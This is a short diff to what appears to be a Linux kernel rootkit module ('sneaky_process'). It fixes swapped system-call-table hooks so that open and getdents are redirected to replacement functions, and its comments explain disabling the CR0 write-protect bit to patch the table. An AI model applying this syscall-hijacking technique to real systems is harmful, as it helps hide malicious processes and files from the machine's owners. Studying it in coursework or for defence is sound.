@@ -21,7 +21,7 @@
 //#include <dirent.h>
 #define BUFFLEN 1024
 #define SNEAKY "sneaky_process"
-#define SNEAKY_SIZE sizeof(SNEAKY)
+
 //Macros for kernel functions to alter Control Register 0 (CR0)
 //This CPU has the 0-bit of CR0 set to 1: protected mode is enabled.
 //Bit 0 is the WP-bit (write protection). We want to flip this to 0
@@ -146,11 +146,11 @@ static int initialize_sneaky_module(void)
   //function address. Then overwrite its address in the system call
   //table with the function address of our new code.
   original_call = (void*)*(sys_call_table + __NR_open);
-  *(sys_call_table + __NR_open) = (unsigned long)sneaky_getdents;
+  *(sys_call_table + __NR_open) = (unsigned long)sneaky_sys_open;
 
   //GetDents swap
   getdents_original = (void*)*(sys_call_table + __NR_getdents);
-  *(sys_call_table + __NR_getdents) = (unsigned long)sneaky_sys_open;
+  *(sys_call_table + __NR_getdents) = (unsigned long)sneaky_getdents;
 
   
   
